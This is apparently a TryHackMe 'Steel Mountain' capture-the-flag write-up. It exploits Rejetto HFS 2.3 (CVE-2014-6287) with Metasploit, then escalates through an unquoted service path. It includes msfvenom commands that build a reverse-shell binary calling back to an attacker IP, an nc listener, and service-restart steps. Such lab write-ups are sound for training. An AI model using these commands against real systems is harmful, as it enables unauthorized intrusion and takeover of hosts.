---
layout: post
title: Steel Mountain - Writeup
author: V0ID7
date: 2023-04-03
categories: [TryHackMe]
icon: https://i.postimg.cc/WpHJTvwP/screenshot-155.jpg
tags: [SteelMountain]
pin: false
image:
  path: https://i.postimg.cc/WpHJTvwP/screenshot-155.jpg
  width: 1280   # in pixels
  height: 720   # in pixels
  alt: 
---

### Welcome Folks!!

This is a free room from TryHackMe, created by tryhackme.

[https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

>Disclaimer 
No flags (user/root) are shown in this writeup, so follow the procedures to grab the flags! Enjoy! 
{: .prompt-danger}

## Task 1 : Introduction !!

Before running nmap scan , let's try to visit the given IP with default port `80` and see what we can find.

![image](https://i.postimg.cc/43C1mXDk/screenshot-67.png){: width='1280' height='720'}

We can see a image , Let's try to check the source code of page to check if we find any usefull information.

![image](https://i.postimg.cc/3wkf4KJ3/screenshot-67.png){: width='1280' height='720'}

As we can see from the source code , the name of the image is bill harper

> **Who is the employee of the month?**<br>
  > *Answer : Bill Harper*

## Task 2: Initial Access

Now let's run nmap and check the open ports and service version info

```shell     
nmap -sV -sC -T4 -p- {IP} -oN nmap_basic 
```
{: file="Nmap Results" }
{: .nolineno }


We get the following result.

```
# Nmap 7.93 scan initiated Wed Apr 19 03:39:36 2023 as: nmap -sV -sC -T4 -p- -oN nmap_basic 10.10.239.241
Nmap scan report for 10.10.239.241
Host is up (0.12s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-04-18T07:34:42
|_Not valid after:  2023-10-18T07:34:42
|_ssl-date: 2023-04-19T07:47:29+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2023-04-19T07:47:24+00:00
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49172/tcp open  msrpc              Microsoft Windows RPC
49173/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-04-19T07:47:22
|_  start_date: 2023-04-19T07:33:55
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02be36c76dcd (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 19 03:47:30 2023 -- 1 IP address (1 host up) scanned in 474.46 seconds
```
{: file="Nmap" }
{: .nolineno }

> **Scan the machine with nmap. What is the other port running a web server on?**<br>
  > *Answer : 8080*

We can see that there is another port `8080` which is running http server HFS , Let's try to vist that and see what we can find.

![image](https://i.postimg.cc/dtwvP5Gm/screenshot-68.png){: width='1280' height='720'}

As we can see it is running the httpFileServer 2.3 (HFS). If we click on the HttpFileServer we can see that it is running a `Rejetto HTTP File Server`

![image](https://i.postimg.cc/4NYzbQSZ/screenshot-69.png){: width='1280' height='720'}

> **Take a look at the other web server. What file server is running?**<br>
  > *Answer : Rejetto HTTP File Server*

Let's try to search on `searchploit` to check if this specific HFS version has any vulnerability

![image](https://i.postimg.cc/7LLGwgTb/screenshot-69.png){: width='1280' height='720'}

As we can see this specific version of HFS is vulnerable and various exploits are available for it.

Here we will be using the `RCE metasploit` exploit

You can check on `exploit-db` to check the CVE number of this exploit

> **What is the CVE number to exploit this file server?**<br>
  > *Answer : 2014-6287*

Now let's try to exploit it using metasploit.

Fireup metasploit and search for `Rejetto HTTP File Server`

![image](https://i.postimg.cc/gkBp7QPw/screenshot-70.png){: width='1280' height='720'}

As we can see their is an exploit available , let's use it.

Set the 
`RHOSTS` value to the `IP` of the victim machine<br>
`RPORT` value to `8080`<br>
`LHOST` value to [Your local IP address]<br>
Make sure the payload s set to `windows/meterpreter/reverse_tcp`<br>

Now `run` the exploit and you will get a session successfully.

![image](https://i.postimg.cc/fbD9rVsT/screenshot-71.png){: width='1280' height='720'}

If we run `getuid` we can see our current user account

Now we can proceed to get the flag. We first move onto the current user’s account folder which is `C:\\Users\\bill`

Then, I searched for files with a `.txt` extension and found an interesting file with the full path as: `c:\Users\bill\Desktop\user.txt`

Now react that file using `cat` to get your first flag. The `user.txt` flag is in `Desktop` directory of `bill`

![image](https://i.postimg.cc/3xMw91DQ/screenshot-71.png){: width='1280' height='720'}

> **Use Metasploit to get an initial shell. What is the user flag?**<br>
  > *Answer : b0xxxxxxxxxxxxxxxxxxxxxxxxx*

## Task 3: Privilege Escalation

Now we need to elevate our privileges to root user

We’ll be using the PowerUp.ps1 powershell script , 

[PowerUP.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

We’ll be using the `PowerUp.ps1` powershell script that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

to upload the `PowerUp.ps1`, type `“upload ./PowerUp.ps1”` (provided your local directory includes the script)

![image](https://i.postimg.cc/TwdtVb6v/screenshot-72.png){: width='1280' height='720'}

Then, to be able to call the script, we load powershell by `“load powershell”` and enter into the shell by typing `“powershell_shell”`. Once that is done, load the script with `“. .\PowerUp.ps1”` and then invoke the function that runs all checks with `“Invoke-AllChecks”`

![image](https://i.postimg.cc/KY691YGt/screenshot-73.png){: width='1280' height='720'}

Take close attention to the CanRestart option that is set to true

![image](https://i.postimg.cc/7ZrCBGH5/screenshot-74.png){: width='1280' height='720'}

**Unquoted service path and CanRestart**

Let’s take a small look and briefly have a look at these two vectors.

An `unquoted service path` is a path that includes a whitespace character, most commonly `“space”`, and that isn’t properly escaped. This is true for the above path of

`….\Advanced SystemCare\ASCService.exe`

what happens here is that the path will be interpreted from left to right and append `“.exe”` on each step until it reaches the intended target, in this case `“ASCService.exe”.`

Let’s have a look at the permissions of that folder, and who we are connected as.

lets run `whoami` to figure out who we are, and then

`icacls 'C:\Program Files (x86)\IObit\Advanced SystemCare'`

![image](https://i.postimg.cc/g2fKHqj1/screenshot-74.png){: width='1280' height='720'}

As we can see we have much more information now which starts making sense.

- Theres an unquoted service path vulnerability, that will run the first executable in the path.
- we are Bill
- Bill has permissions to write in the `\IObit\` folder.
- The “CanRestart=True” means that we can restart the service.Okay, so now we have a few dots that we can connect,

[If you don't understand what we did , check out the following explanation]

Craft `evil.exe` with name `“Advanced.exe”` — > since we are Bill and Bill has permission to write into the folder, put our `“Advanced.exe”` into the `C:\Program Files (x86)\IObit` folder — > `restart service`.

Once the execution reaches `“…\IObit\Advanced”` it will append `.exe` to `“Advanced”` and therefore, executing our evil binary.

Now Let’s create our evil binary, we’ll use msfvenom like so:

```shell     
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exemsfvenom -p windows/shell_reverse_tcp LHOST=10.17.8.26 LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```
{: .nolineno }

![image](https://i.postimg.cc/tT6wSrt6/screenshot-75.png){: width='1280' height='720'}

Now upload this payload `Advanced.exe` to the victim machine using the `upload` command in meterpreter

![image](https://i.postimg.cc/4N9fGvvN/screenshot-76.png){: width='1280' height='720'}

When this binary runs, it’ll connect back to our IP.

Before we restart the service , we fire up a listener on our machine.

```shell     
nc -lvnp 1234
```
{: .nolineno }

Alright, then let’s drop to a shell in our meterpreter session by typing `“shell”` and then stop the service with `“sc stop AdvancedSystemCareService9”`

Now before startering the service again , Copy the Advanced.exe file into the IObt directory as shown below.

```shell     
copy Advanced.exe "C:\Program Files (x86)\IObit"
```
{: .nolineno }

![image](https://i.postimg.cc/1zVFk7RR/screenshot-77.png){: width='1280' height='720'}

Now restart the service using `"sc start AdvancedSystemCareService9"`

As soon as you start the service You will get a shell on our `Netcat` listener.

Now navigate to the `Administrator's` Desktop directory to get the `root` flag

![image](https://i.postimg.cc/VL1nTFbn/screenshot-77.png){: width='1280' height='720'}

Great , Congrats we got the root flag. Now let's answer the questions

> **Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?**<br>
  > *Answer : AdvancedSystemCareService9*

> **What is the root flag?**<br>
  > *Answer : 9axxxxxxxxxxxxxxxxxxxx*






















